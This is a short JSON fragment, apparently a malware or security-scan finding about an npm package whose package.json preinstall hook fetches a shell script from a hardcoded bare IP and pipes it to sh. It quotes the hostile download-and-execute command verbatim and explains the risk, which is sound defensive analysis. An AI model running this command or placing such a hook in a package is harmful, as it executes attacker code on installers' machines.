  "summary": "preinstall pipes remote shell script from bare IP to sh",
  "details": "package.json declares a preinstall lifecycle script `curl -s 216.126.236.46/x.sh|sh` that fetches a shell script from a hardcoded bare IP over plain HTTP and pipes it into sh. On `npm install`, this executes attacker-controlled code on the installer's machine with the user's privileges. The fetch is unpinned, unauthenticated, and served over cleartext HTTP, so the executed content can change at any time and is also exposed to on-path modification. The shipped index.js is an inert stub, so the manifest's preinstall hook is the package's only material effect.",
